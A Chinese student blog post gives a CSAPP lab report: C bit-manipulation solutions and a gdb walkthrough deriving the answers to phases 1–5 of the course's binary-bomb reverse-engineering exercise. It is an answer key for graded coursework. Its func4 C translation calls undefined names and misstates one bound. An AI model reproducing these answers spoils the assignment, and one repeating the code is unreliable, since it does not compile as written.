---
title: 计算机系统基础(上)实验报告-CSAPP拆弹实验
date: 2022-04-23 16:51:11
tags:
---

&nbsp;	
<!-- more -->

参考文章:
https://blog.csdn.net/The_V_/article/details/46842573?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1

https://www.cnblogs.com/chkkch/archive/2011/05/21/2052708.html

https://blog.csdn.net/shiyuqing1207/article/details/46316519?utm_medium=distribute.pc_relevant.none-task-blog-title-6&spm=1001.2101.3001.4242

### Lab1： 数据操纵实验

```
int bitXor(int x, int y) {
       int c=~((~(~x&y))&(~(x&(~y))));
       return c;
}

int getByte(int x, int n) {
  return ((x>>(n<<3))&0xff);
}

int logicalShift(int x, int n) {
  int t=~(((1<<31)>>n)<<1);
  return (x>>n)&t;
}

int bitCount(int x) {
  int result;
  int tmp_mask1=(0x55)|(0x55<<8);
  int mask1=(tmp_mask1)|(tmp_mask1<<16);
  int tmp_mask2=(0x33)|(0x33<<8);
  int mask2=(tmp_mask2)|(tmp_mask2<<16);
  int tmp_mask3=(0x0f)|(0x0f<<8);
  int mask3=(tmp_mask3)|(tmp_mask3<<16);
  int mask4=(0xff)|(0xff<<16);
  int mask5=(0xff)|(0xff<<8);
  result=(x&mask1)+((x>>1)&mask1);
  result=(result&mask2)+((result>>2)&mask2);
  result=(result+(result>>4))&mask3;
  result=(result+(result>>8))&mask4;
  result=(result+(result>>16))&mask5;
  return result;
}

int bang(int x) {
  return (~((x|(~x+1))>>31))&1;
}

int tmin(void) {
  return 1<<31;
}

int byteSwap(int x, int n, int m) {
  int xn=n<<3;
  int xm=m<<3;
  int x1=(x>>xn)<<xm;
  int x2=(x>>xm)<<xn;
  int t=(x&(~(0xff<<xn))&(~(0xff<<xm)))|(x1&(0xff<<xm))|(x2&(0xff<<xn));
  return t;
}

int byteXor(int x, int y, int n) {
    n=n<<3;
    x=(x>>n)&0xff;
    y=(y>>n)&0xff;
    return !!(x^y);
}

unsigned float_abs(unsigned uf) {
  int x = uf&0x7fffffff;
  if(x>0x7f800000)
    return uf;
  else
    return x;
}

int isPositive(int x) {
  return !((x>>31)|(!x));
}

int isLessOrEqual(int x, int y) {
  int signx=(x>>31)&1;//x的符号位 
  	int signy=(y>>31)&1;//y的符号位 
  	int signy_x=((y+~x+1)>>31)&1;//y-x的符号位 
  	return (!(signx^signy)&!signy_x) | ((signx^signy)&signx);//同号 异号 
}

int ilog2(int x) {
	int sign,shift1,shift2,shift3,shift4,shift5;
  	sign=!!(x>>16);//若x表示的二进制数左边16位没有1，sign为0,有1则sign为1 
  	shift1=sign<<4;//0^4 or 2^4
	x=x>>shift1;//若sign为1，丢掉右边16位，因为1必定出现在左边16位中 
	
	sign=!!(x>>8);//若x表示的二进制数左边8位没有1，sign为0,有1则sign为1 
	shift2=sign<<3;//0^3 or 2^3
	x=x>>shift2;//若sign为1，丢掉右边8位，因为1必定出现在左边8位中 
	
	sign=!!(x>>4);//若x表示的二进制数左边4位没有1，sign为0,有1则sign为1 
	shift3=sign<<2;//0^2 or 2^2
	x=x>>shift3;//若sign为1，丢掉右边4位，因为1必定出现在左边4位中 
	
	sign=!!(x>>2);//若x表示的二进制数左边2位没有1，sign为0,有1则sign为1 
	shift4=sign<<1;//0^1 or 2^1
	x=x>>shift4;//若sign为1，丢掉右边2位，因为1必定出现在左边2位中 
	
	sign=!!(x>>1);//若x表示的二进制数左边1位没有1，sign为0,有1则sign为1 
	shift5=sign; 
	
	return shift1+shift2+shift3+shift4+shift5;//偏移量相加即得结果
}

unsigned float_neg(unsigned uf) {
  unsigned result;
  unsigned tmp;
  tmp=uf&(0x7fffffff);
  result=uf^0x80000000;
  if(tmp>0x7f800000)
    result =uf;
  return result;
}

int float_f2i(unsigned uf) {
   int sign=uf>>31; 
  int exp=(uf>>23)&0xff;
  int frac=uf&0x007fffff;
  int right=157-exp;
  int abs;
  if (exp<0x7f)
    return 0;
  if (exp>157)
    return 0x80000000;
  abs=(0x40000000+(frac<<7))>>right;
  if (sign)
    return -abs;
  else 
    return abs;

}

unsigned float_twice(unsigned uf) {
  unsigned f=uf;
  if((f&0x7f800000)==0){
    f=((f&0x007FFFFF)<<1|(0x80000000&f));
 }else if ((f&0x7F800000)!=0x7F800000){
      f+=0x00800000;
    }
  return f;
}
```

------

### Lab2: 拆弹实验

第一关反汇编内容：

```
08048b5a <phase_1>:
 8048b5a:	55                   	push   %ebp
 8048b5b:	89 e5                	mov    %esp,%ebp
 8048b5d:	83 ec 10             	sub    $0x10,%esp
 8048b60:	68 44 a1 04 08       	push   $0x804a144
 8048b65:	ff 75 08             	pushl  0x8(%ebp)
 8048b68:	e8 65 05 00 00       	call   80490d2 <strings_not_equal>
 8048b6d:	83 c4 10             	add    $0x10,%esp
 8048b70:	85 c0                	test   %eax,%eax
 8048b72:	75 02                	jne    8048b76 <phase_1+0x1c>
 8048b74:	c9                   	leave  
 8048b75:	c3                   	ret    
 8048b76:	e8 58 06 00 00       	call   80491d3 <explode_bomb>
 8048b7b:	eb f7                	jmp    8048b74 <phase_1+0x1a>
```

从8048b60-8048b68可以看出这里将我们这关(phase_1)填的内容（ 0x8(%ebp) ) 和0x804a144处的内容传给了80490d2处的一个函数，
出后面的解释可以看出这个函数的功能是判断输入的两个字符串是否相同，
test %eax,%eax这句应该是返回的判断结果，如果不相等就跳到8048b76处（bomb函数），
所以要过关就要使我们填入的内容与0x804a144处的内容一样（使返回判断结果相同），
在gdb中用x/s 0x804a144 查看得知本关的密码是:
I turned the moon into something I call a Death Star.

第二关：

```
08048b7d <phase_2>:
 8048b7d:	55                   	push   %ebp
 8048b7e:	89 e5                	mov    %esp,%ebp
 8048b80:	53                   	push   %ebx
 8048b81:	83 ec 2c             	sub    $0x2c,%esp
 8048b84:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
 8048b8a:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8048b8d:	31 c0                	xor    %eax,%eax
 8048b8f:	8d 45 dc             	lea    -0x24(%ebp),%eax
 8048b92:	50                   	push   %eax
 8048b93:	ff 75 08             	pushl  0x8(%ebp)
 8048b96:	e8 60 06 00 00       	call   80491fb <read_six_numbers>
 8048b9b:	83 c4 10             	add    $0x10,%esp
 8048b9e:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
 8048ba2:	78 07                	js     8048bab <phase_2+0x2e>
 8048ba4:	bb 01 00 00 00       	mov    $0x1,%ebx
 8048ba9:	eb 0f                	jmp    8048bba <phase_2+0x3d>
 8048bab:	e8 23 06 00 00       	call   80491d3 <explode_bomb>
 8048bb0:	eb f2                	jmp    8048ba4 <phase_2+0x27>
 8048bb2:	83 c3 01             	add    $0x1,%ebx
 8048bb5:	83 fb 06             	cmp    $0x6,%ebx
 8048bb8:	74 13                	je     8048bcd <phase_2+0x50>
 8048bba:	89 d8                	mov    %ebx,%eax
 8048bbc:	03 44 9d d8          	add    -0x28(%ebp,%ebx,4),%eax
 8048bc0:	39 44 9d dc          	cmp    %eax,-0x24(%ebp,%ebx,4)
 8048bc4:	74 ec                	je     8048bb2 <phase_2+0x35>
 8048bc6:	e8 08 06 00 00       	call   80491d3 <explode_bomb>
 8048bcb:	eb e5                	jmp    8048bb2 <phase_2+0x35>
 8048bcd:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048bd0:	65 33 05 14 00 00 00 	xor    %gs:0x14,%eax
 8048bd7:	75 05                	jne    8048bde <phase_2+0x61>
 8048bd9:	8b 5d fc             	mov    -0x4(%ebp),%ebx
 8048bdc:	c9                   	leave  
 8048bdd:	c3                   	ret    
 8048bde:	e8 ad fb ff ff       	call   8048790 <__stack_chk_fail@plt>
```

结合之前的经验可以知道，本关要求输入6个数字，结合汇编内容可以知道本关对数组的要求满足
A[i+1]=A[i]+i+1,从cmpl $0x0,-0x24(%ebp) js 可知要求A[0]>=0,所以选了1 2 4 7 11 16作为答案

第三关：

```
08048be3 <phase_3>:
 8048be3:	55                   	push   %ebp
 8048be4:	89 e5                	mov    %esp,%ebp
 8048be6:	83 ec 24             	sub    $0x24,%esp
 8048be9:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
 8048bef:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8048bf2:	31 c0                	xor    %eax,%eax
 8048bf4:	8d 45 f0             	lea    -0x10(%ebp),%eax
 8048bf7:	50                   	push   %eax
 8048bf8:	8d 45 eb             	lea    -0x15(%ebp),%eax
 8048bfb:	50                   	push   %eax
 8048bfc:	8d 45 ec             	lea    -0x14(%ebp),%eax
 8048bff:	50                   	push   %eax
 8048c00:	68 a2 a1 04 08       	push   $0x804a1a2
 8048c05:	ff 75 08             	pushl  0x8(%ebp)
 8048c08:	e8 03 fc ff ff       	call   8048810 <__isoc99_sscanf@plt>
 8048c0d:	83 c4 20             	add    $0x20,%esp
 8048c10:	83 f8 02             	cmp    $0x2,%eax
 8048c13:	7e 14                	jle    8048c29 <phase_3+0x46>
 8048c15:	83 7d ec 07          	cmpl   $0x7,-0x14(%ebp)
 8048c19:	0f 87 f0 00 00 00    	ja     8048d0f <phase_3+0x12c>
 8048c1f:	8b 45 ec             	mov    -0x14(%ebp),%eax
 8048c22:	ff 24 85 c0 a1 04 08 	jmp    *0x804a1c0(,%eax,4)
 8048c29:	e8 a5 05 00 00       	call   80491d3 <explode_bomb>
 8048c2e:	eb e5                	jmp    8048c15 <phase_3+0x32>
 8048c30:	b8 68 00 00 00       	mov    $0x68,%eax
 8048c35:	81 7d f0 e3 01 00 00 	cmpl   $0x1e3,-0x10(%ebp)
 8048c3c:	0f 84 d7 00 00 00    	je     8048d19 <phase_3+0x136>
 8048c42:	e8 8c 05 00 00       	call   80491d3 <explode_bomb>
 8048c47:	b8 68 00 00 00       	mov    $0x68,%eax
 8048c4c:	e9 c8 00 00 00       	jmp    8048d19 <phase_3+0x136>
 8048c51:	b8 6e 00 00 00       	mov    $0x6e,%eax
 8048c56:	81 7d f0 11 03 00 00 	cmpl   $0x311,-0x10(%ebp)
 8048c5d:	0f 84 b6 00 00 00    	je     8048d19 <phase_3+0x136>
 8048c63:	e8 6b 05 00 00       	call   80491d3 <explode_bomb>
 8048c68:	b8 6e 00 00 00       	mov    $0x6e,%eax
 8048c6d:	e9 a7 00 00 00       	jmp    8048d19 <phase_3+0x136>
 8048c72:	b8 66 00 00 00       	mov    $0x66,%eax
 8048c77:	83 7d f0 58          	cmpl   $0x58,-0x10(%ebp)
 8048c7b:	0f 84 98 00 00 00    	je     8048d19 <phase_3+0x136>
 8048c81:	e8 4d 05 00 00       	call   80491d3 <explode_bomb>
 8048c86:	b8 66 00 00 00       	mov    $0x66,%eax
 8048c8b:	e9 89 00 00 00       	jmp    8048d19 <phase_3+0x136>
 8048c90:	b8 70 00 00 00       	mov    $0x70,%eax
 8048c95:	83 7d f0 72          	cmpl   $0x72,-0x10(%ebp)
 8048c99:	74 7e                	je     8048d19 <phase_3+0x136>
 8048c9b:	e8 33 05 00 00       	call   80491d3 <explode_bomb>
 8048ca0:	b8 70 00 00 00       	mov    $0x70,%eax
 8048ca5:	eb 72                	jmp    8048d19 <phase_3+0x136>
 8048ca7:	b8 6f 00 00 00       	mov    $0x6f,%eax
 8048cac:	81 7d f0 ba 03 00 00 	cmpl   $0x3ba,-0x10(%ebp)
 8048cb3:	74 64                	je     8048d19 <phase_3+0x136>
 8048cb5:	e8 19 05 00 00       	call   80491d3 <explode_bomb>
 8048cba:	b8 6f 00 00 00       	mov    $0x6f,%eax
 8048cbf:	eb 58                	jmp    8048d19 <phase_3+0x136>
 8048cc1:	b8 70 00 00 00       	mov    $0x70,%eax
 8048cc6:	81 7d f0 66 01 00 00 	cmpl   $0x166,-0x10(%ebp)
 8048ccd:	74 4a                	je     8048d19 <phase_3+0x136>
 8048ccf:	e8 ff 04 00 00       	call   80491d3 <explode_bomb>
 8048cd4:	b8 70 00 00 00       	mov    $0x70,%eax
 8048cd9:	eb 3e                	jmp    8048d19 <phase_3+0x136>
 8048cdb:	b8 6c 00 00 00       	mov    $0x6c,%eax
 8048ce0:	81 7d f0 01 03 00 00 	cmpl   $0x301,-0x10(%ebp)
 8048ce7:	74 30                	je     8048d19 <phase_3+0x136>
 8048ce9:	e8 e5 04 00 00       	call   80491d3 <explode_bomb>
 8048cee:	b8 6c 00 00 00       	mov    $0x6c,%eax
 8048cf3:	eb 24                	jmp    8048d19 <phase_3+0x136>
 8048cf5:	b8 6a 00 00 00       	mov    $0x6a,%eax
 8048cfa:	81 7d f0 36 02 00 00 	cmpl   $0x236,-0x10(%ebp)
 8048d01:	74 16                	je     8048d19 <phase_3+0x136>
 8048d03:	e8 cb 04 00 00       	call   80491d3 <explode_bomb>
 8048d08:	b8 6a 00 00 00       	mov    $0x6a,%eax
 8048d0d:	eb 0a                	jmp    8048d19 <phase_3+0x136>
 8048d0f:	e8 bf 04 00 00       	call   80491d3 <explode_bomb>
 8048d14:	b8 79 00 00 00       	mov    $0x79,%eax
 8048d19:	38 45 eb             	cmp    %al,-0x15(%ebp)
 8048d1c:	74 05                	je     8048d23 <phase_3+0x140>
 8048d1e:	e8 b0 04 00 00       	call   80491d3 <explode_bomb>
 8048d23:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048d26:	65 33 05 14 00 00 00 	xor    %gs:0x14,%eax
 8048d2d:	75 02                	jne    8048d31 <phase_3+0x14e>
 8048d2f:	c9                   	leave  
 8048d30:	c3                   	ret    
 8048d31:	e8 5a fa ff ff       	call   8048790 <__stack_chk_fail@plt>

```

从8048c08:call 8048810 <__isoc99_sscanf@plt>，可以看出在出处调用了一个函数，在一个博主的个人博客里看到
他是这样解释的：“猜测sscanf可能是C语言的内部函数，于是查到其定义为：int sscanf(const char *str, const char *format,…)，
给出一个使用实例：sscanf(“s 1”, “%s %d”, str, &a)，
函数返回2（因为接收了2个参数），str为char*类型，保存”s”；a为int类型，保存1。”
这里可以看出，sscanf的第二个参数为输入答案要求的类型和个数，
再看反汇编部分可知sscanf的第二个参数为 $0x804a1a2处的内容，
gdb中在phase_3设断点，可查$0x804a1a2处的内容为“%d %c %d”，所以第三关要求输入两个
整数，一个字符.从cmp $0x2,%eax ，jle 8048c29 <phase_3+0x46>（bomb）两局也可以看出要求输入三个参数。

```
8048bf4:	8d 45 f0             	lea    -0x10(%ebp),%eax
8048bf7:	50                   	push   %eax
8048bf8:	8d 45 eb             	lea    -0x15(%ebp),%eax
8048bfb:	50                   	push   %eax
8048bfc:	8d 45 ec             	lea    -0x14(%ebp),%eax
8048bff:	50                   	push   %eax
8048c00:	68 a2 a1 04 08       	push   $0x804a1a2
8048c05:	ff 75 08             	pushl  0x8(%ebp)
```

上面几行是sscanf的参数：0x8(%ebp)是phase_3的参数，也就是本关要输入的密码，$0x804a1a2是输入数据的类型，lea -0x14(%ebp),%eax，lea -0x15(%ebp),%eax，lea -0x10(%ebp),%eax，则对应0x8(%ebp)的第一，二，三个数据，即：

-0x14(%ebp)–>data1(int)

-0x15(%ebp)–>data2(char)

-0x10(%ebp)–>data3(int)

接着读，

```
8048c15:	83 7d ec 07          	cmpl   $0x7,-0x14(%ebp)
 8048c19:	0f 87 f0 00 00 00    	ja     8048d0f <phase_3+0x12c>//（bomb)
```

这里看到过关的一个条件:data1<7，
接着看

```
8048c1f:	8b 45 ec             	mov    -0x14(%ebp),%eax
8048c22:	ff 24 85 c0 a1 04 08 	jmp    *0x804a1c0(,%eax,4)
```

可以看出eax里是data1，所以是跳转到*（0x804a1c0+4*data1),在gdb中查看data1在合理取值的跳转位置：

```
*(0x804a1c0+0)=0x8048c30;
*(0x804a1c0+4)=0x8048c51;
*(0x804a1c0+8)=0x8048c72;
*(0x804a1c0+12)=0x8048c90;
*(0x804a1c0+16)=0x8048ca7;
*(0x804a1c0+20)=0x8048cc1;
*(0x804a1c0+24)=0x8048cdb;
```

本着快速过关的想法，我就看了data1=0时的情况：

```
8048c30:	b8 68 00 00 00       	mov    $0x68,%eax
8048c35:	81 7d f0 e3 01 00 00 	cmpl   $0x1e3,-0x10(%ebp)
8048c3c:	0f 84 d7 00 00 00    	je     8048d19 <phase_3+0x136>
8048c42:	e8 8c 05 00 00       	call   80491d3 <explode_bomb>
```

第二行是通关的一个条件：data3 = 0x1e3（483D），然后再跳一次：

```
8048d19:	38 45 eb             	cmp    %al,-0x15(%ebp)
8048d1c:	74 05                	je     8048d23 <phase_3+0x140>
8048d1e:	e8 b0 04 00 00       	call   80491d3 <explode_bomb>
8048d23:	8b 45 f4             	mov    -0xc(%ebp),%eax
8048d26:	65 33 05 14 00 00 00 	xor    %gs:0x14,%eax
8048d2d:	75 02                	jne    8048d31 <phase_3+0x14e>
8048d2f:	c9                   	leave  
8048d30:	c3                   	ret  
```

这里是第三个通关条件，要求data2 = %al。
这个 al 寄存器当初看课的时候没有太留意，当时做到这里，因为不认识，这个al耽误了我一天的时间。。。。。。
当时没看老师讲实验的直播，群里的聊天记录做实验时看了看，但是没得到什么有用的信息，
所以就没有装32位的lib库，导致我不能跑bobm，所以当时想了半天反应过来直接查寄存器内容的想法也没实现，
在查了许久的百度终于查到，eax的低8位，查到时就反应过来袁春风老师视频里好像是讲过的，想到这里流下了不学无数的眼泪。。。。。。
前面mov $0x68,%eax看到eax内容为0x68（01101000B=104D）
因为data2是char类型的,查看ascii表知道‘h’的值为104，所以本关的答案之一：0 h 483

第四关：

```
08048d93 <phase_4>:
 8048d93:	55                   	push   %ebp
 8048d94:	89 e5                	mov    %esp,%ebp
 8048d96:	83 ec 18             	sub    $0x18,%esp
 8048d99:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
 8048d9f:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8048da2:	31 c0                	xor    %eax,%eax
 8048da4:	8d 45 f0             	lea    -0x10(%ebp),%eax
 8048da7:	50                   	push   %eax
 8048da8:	8d 45 ec             	lea    -0x14(%ebp),%eax
 8048dab:	50                   	push   %eax
 8048dac:	68 2f a3 04 08       	push   $0x804a32f
 8048db1:	ff 75 08             	pushl  0x8(%ebp)
 8048db4:	e8 57 fa ff ff       	call   8048810 <__isoc99_sscanf@plt>
 8048db9:	83 c4 10             	add    $0x10,%esp
 8048dbc:	83 f8 02             	cmp    $0x2,%eax
 8048dbf:	75 06                	jne    8048dc7 <phase_4+0x34>
 8048dc1:	83 7d ec 0e          	cmpl   $0xe,-0x14(%ebp)
 8048dc5:	76 05                	jbe    8048dcc <phase_4+0x39>
 8048dc7:	e8 07 04 00 00       	call   80491d3 <explode_bomb>
 8048dcc:	83 ec 04             	sub    $0x4,%esp
 8048dcf:	6a 0e                	push   $0xe
 8048dd1:	6a 00                	push   $0x0
 8048dd3:	ff 75 ec             	pushl  -0x14(%ebp)
 8048dd6:	e8 5b ff ff ff       	call   8048d36 <func4>
 8048ddb:	83 c4 10             	add    $0x10,%esp
 8048dde:	83 f8 06             	cmp    $0x6,%eax
 8048de1:	75 06                	jne    8048de9 <phase_4+0x56>
 8048de3:	83 7d f0 06          	cmpl   $0x6,-0x10(%ebp)
 8048de7:	74 05                	je     8048dee <phase_4+0x5b>
 8048de9:	e8 e5 03 00 00       	call   80491d3 <explode_bomb>
 8048dee:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048df1:	65 33 05 14 00 00 00 	xor    %gs:0x14,%eax
 8048df8:	75 02                	jne    8048dfc <phase_4+0x69>
 8048dfa:	c9                   	leave  
 8048dfb:	c3                   	ret    
 8048dfc:	e8 8f f9 ff ff       	call   8048790 <__stack_chk_fail@plt>
```

根据上面的经验，先看0x804a32f的内容，gdb中查看是“%d %d”，然后读：

```
8048dc1:	83 7d ec 0e          	cmpl   $0xe,-0x14(%ebp)
8048dc5:	76 05                	jbe    8048dcc <phase_4+0x39>
8048dc7:	e8 07 04 00 00       	call   80491d3 <explode_bomb>
```

看出条件1：data1<=14,然后就是对func4的调用：

```
8048dd6:	e8 5b ff ff ff       	call   8048d36 <func4>
 8048ddb:	83 c4 10             	add    $0x10,%esp
 8048dde:	83 f8 06             	cmp    $0x6,%eax
 8048de1:	75 06                	jne    8048de9 <phase_4+0x56>（bomb）
```

可以看到条件2：func4返回值（%eax）要为6，

```
8048de3:	83 7d f0 06          	cmpl   $0x6,-0x10(%ebp)
8048de7:	74 05                	je     8048dee <phase_4+0x5b>
```

可以知道条件3：data2=6，满足这3个条件就可以过关了。主要还是func4的内容：

```
08048d36 <func4>:
 8048d36:	55                   	push   %ebp
 8048d37:	89 e5                	mov    %esp,%ebp
 8048d39:	53                   	push   %ebx
 8048d3a:	83 ec 04             	sub    $0x4,%esp
 8048d3d:	8b 4d 08             	mov    0x8(%ebp),%ecx
 8048d40:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048d43:	8b 5d 10             	mov    0x10(%ebp),%ebx
 8048d46:	29 c3                	sub    %eax,%ebx
 8048d48:	89 da                	mov    %ebx,%edx
 8048d4a:	c1 ea 1f             	shr    $0x1f,%edx
 8048d4d:	01 da                	add    %ebx,%edx
 8048d4f:	d1 fa                	sar    %edx
 8048d51:	01 c2                	add    %eax,%edx
 8048d53:	39 ca                	cmp    %ecx,%edx
 8048d55:	7f 0e                	jg     8048d65 <func4+0x2f>
 8048d57:	b8 00 00 00 00       	mov    $0x0,%eax
 8048d5c:	39 ca                	cmp    %ecx,%edx
 8048d5e:	7c 1a                	jl     8048d7a <func4+0x44>
 8048d60:	8b 5d fc             	mov    -0x4(%ebp),%ebx
 8048d63:	c9                   	leave  
 8048d64:	c3                   	ret    
 8048d65:	83 ec 04             	sub    $0x4,%esp
 8048d68:	83 ea 01             	sub    $0x1,%edx
 8048d6b:	52                   	push   %edx
 8048d6c:	50                   	push   %eax
 8048d6d:	51                   	push   %ecx
 8048d6e:	e8 c3 ff ff ff       	call   8048d36 <func4>
 8048d73:	83 c4 10             	add    $0x10,%esp
 8048d76:	01 c0                	add    %eax,%eax
 8048d78:	eb e6                	jmp    8048d60 <func4+0x2a>
 8048d7a:	83 ec 04             	sub    $0x4,%esp
 8048d7d:	ff 75 10             	pushl  0x10(%ebp)
 8048d80:	83 c2 01             	add    $0x1,%edx
 8048d83:	52                   	push   %edx
 8048d84:	51                   	push   %ecx
 8048d85:	e8 ac ff ff ff       	call   8048d36 <func4>
 8048d8a:	83 c4 10             	add    $0x10,%esp
 8048d8d:	8d 44 00 01          	lea    0x1(%eax,%eax,1),%eax
 8048d91:	eb cd                	jmp    8048d60 <func4+0x2a>
```

这里就不一步步的分析了，主要是func4里都是各种跳转和过程调用，不太好描述，这里给出自己修了几版的func4的c语言版
（这里吐槽一下，因为自己对eax寄存器里存放函数返回值这个点理解的不透彻，所以真的是把这点内容改了好几遍）：

```
int func4(int a,int b,int c){
	c=c-b;
	int t=c;
	t=t>>31;
	t+=c;
	t=t/2;
	t+=b;
	if(a<t)
		return 2*fun(t-1,b,a);
	else
	if(a>t)
		return 2*fun(c1,t+1,a)+1;
	return 0;
}
```

根据data2=6，倒推data1为6.所以本关答案：6 6
第4关的内容是递归，因为自己对递归的过程不是那么的理解，而且对过程调用的一些细节了解的不是那么透，所以当时做的时候还是比较头疼的。

第五关：

```
08048e01 <phase_5>:
 8048e01:	55                   	push   %ebp
 8048e02:	89 e5                	mov    %esp,%ebp
 8048e04:	83 ec 18             	sub    $0x18,%esp
 8048e07:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
 8048e0d:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8048e10:	31 c0                	xor    %eax,%eax
 8048e12:	8d 45 f0             	lea    -0x10(%ebp),%eax
 8048e15:	50                   	push   %eax
 8048e16:	8d 45 ec             	lea    -0x14(%ebp),%eax
 8048e19:	50                   	push   %eax
 8048e1a:	68 2f a3 04 08       	push   $0x804a32f
 8048e1f:	ff 75 08             	pushl  0x8(%ebp)
 8048e22:	e8 e9 f9 ff ff       	call   8048810 <__isoc99_sscanf@plt>
 8048e27:	83 c4 10             	add    $0x10,%esp
 8048e2a:	83 f8 01             	cmp    $0x1,%eax
 8048e2d:	7e 4d                	jle    8048e7c <phase_5+0x7b>
 8048e2f:	8b 45 ec             	mov    -0x14(%ebp),%eax
 8048e32:	83 e0 0f             	and    $0xf,%eax
 8048e35:	89 45 ec             	mov    %eax,-0x14(%ebp)
 8048e38:	83 f8 0f             	cmp    $0xf,%eax
 8048e3b:	74 2c                	je     8048e69 <phase_5+0x68>
 8048e3d:	b9 00 00 00 00       	mov    $0x0,%ecx
 8048e42:	ba 00 00 00 00       	mov    $0x0,%edx
 8048e47:	83 c2 01             	add    $0x1,%edx
 8048e4a:	8b 04 85 e0 a1 04 08 	mov    0x804a1e0(,%eax,4),%eax
 8048e51:	01 c1                	add    %eax,%ecx
 8048e53:	83 f8 0f             	cmp    $0xf,%eax
 8048e56:	75 ef                	jne    8048e47 <phase_5+0x46>
 8048e58:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
 8048e5f:	83 fa 0f             	cmp    $0xf,%edx
 8048e62:	75 05                	jne    8048e69 <phase_5+0x68>
 8048e64:	39 4d f0             	cmp    %ecx,-0x10(%ebp)
 8048e67:	74 05                	je     8048e6e <phase_5+0x6d>
 8048e69:	e8 65 03 00 00       	call   80491d3 <explode_bomb>
 8048e6e:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048e71:	65 33 05 14 00 00 00 	xor    %gs:0x14,%eax
 8048e78:	75 09                	jne    8048e83 <phase_5+0x82>
 8048e7a:	c9                   	leave  
 8048e7b:	c3                   	ret    
 8048e7c:	e8 52 03 00 00       	call   80491d3 <explode_bomb>
 8048e81:	eb ac                	jmp    8048e2f <phase_5+0x2e>
 8048e83:	e8 08 f9 ff ff       	call   8048790 <__stack_chk_fail@plt>
```

第五关好像主要是循环，当时也没用多久就搞定了，感觉应该把这关放到前面一点。
结合前面的内容，想看输入的格式$0x804a32f处内容为“%d %d”,
-0x14(%ebp)–>data1
-0x10(%ebp)–>data2
看下面：

```
8048e2f:	8b 45 ec             	mov    -0x14(%ebp),%eax
 8048e32:	83 e0 0f             	and    $0xf,%eax
 8048e35:	89 45 ec             	mov    %eax,-0x14(%ebp)
 8048e38:	83 f8 0f             	cmp    $0xf,%eax
 8048e3b:	74 2c                	je     8048e69 <phase_5+0x68>
```

这里有一个条件：data1！=15
接着看：

```
8048e3d:	b9 00 00 00 00       	mov    $0x0,%ecx
8048e42:	ba 00 00 00 00       	mov    $0x0,%edx
8048e47:	83 c2 01             	add    $0x1,%edx
8048e4a:	8b 04 85 e0 a1 04 08 	mov    0x804a1e0(,%eax,4),%eax
8048e51:	01 c1                	add    %eax,%ecx
8048e53:	83 f8 0f             	cmp    $0xf,%eax
8048e56:	75 ef                	jne    8048e47 <phase_5+0x46>
8048e58:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
8048e5f:	83 fa 0f             	cmp    $0xf,%edx
8048e62:	75 05                	jne    8048e69 <phase_5+0x68>（bomb）
```

这里的内容是个循环，循环变量是%eax，当%eax=15时跳出循环，而且下面时出现了一个新的条件
%edx=15，而循环开始时%edx=1，每循环一次%exd+1，所以第二个条件相当于要求循环15次，循环内容是%eax=*（0x804a1e0+eax*4），%exc+=%eax,
这时gdb中查看0x804a1e0处及其之后的内容，在gdb中用x/x 0x804a1e0指令时显示0x804a1e0<array.3035>:10,
这里猜0x8048a1e0是一个数组的首地址，然后就一次查看多个内存单元，最终看到这个数组长度为16
x/16u 0x804a1e0显示结果：
0x804a1e0<array.3035> :10 2 14 7
0x804a1e0<array.3035+16>:8 12 15 11
0x804a1e0<array.3035+32>:0 4 1 13
0x804a1e0<array.3035+48>:3 9 6 5
这里对%eax=*（0x804a1e0+eax*4）表达式分析，可以看出eax内容是会循环的，
假设eax初值为A[0]=10,这个循环为：
A[0]->A[10]->A[1]->A[2]->A[14]->A[6]->A[15]->A[5]->A[12]->A[3]->A[7]->A[11]->A[13]->A[9]->A[4]->A[8]->A[0]
要求循环15次，切结束循环时%eax=15则%eax初值为A[5],所以第一个%eax=*（0x804a1e0+eax*4）=A[5]所以%eax=5,
而此时eax内存放data1的值，所以data1=5,ecx的内容为eax内容的累加，
所以%ecx=A[5]+A[12]+A[3]+A[7]+A[11]+A[13]+A[9]+A[4]+A[8]+A[0]+A[10]+A[1]+A[2]+A[14]+A[6]，
可以看到数值的内容是1–15，而%ecx是数组之和减A[15],即%ecx=（0+15）*16/2-5=115

```
8048e64:	39 4d f0             	cmp    %ecx,-0x10(%ebp)
 8048e67:	74 05                	je     8048e6e <phase_5+0x6d>
 8048e69:	e8 65 03 00 00       	call   80491d3 <explode_bomb>
 8048e6e:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048e71:	65 33 05 14 00 00 00 	xor    %gs:0x14,%eax
 8048e78:	75 09                	jne    8048e83 <phase_5+0x82>
 8048e7a:	c9                   	leave  
 8048e7b:	c3                   	ret    

```

结尾部分是最后一个条件：data2 = %ecx，所以本关答案为 5 115
第六关：

```
 08048e88 <phase_6>:
 8048e88:	55                   	push   %ebp
 8048e89:	89 e5                	mov    %esp,%ebp
 8048e8b:	56                   	push   %esi
 8048e8c:	53                   	push   %ebx
 8048e8d:	83 ec 48             	sub    $0x48,%esp
 8048e90:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
 8048e96:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8048e99:	31 c0                	xor    %eax,%eax
 8048e9b:	8d 45 c4             	lea    -0x3c(%ebp),%eax
 8048e9e:	50                   	push   %eax
 8048e9f:	ff 75 08             	pushl  0x8(%ebp)
 8048ea2:	e8 54 03 00 00       	call   80491fb <read_six_numbers>
 8048ea7:	83 c4 10             	add    $0x10,%esp
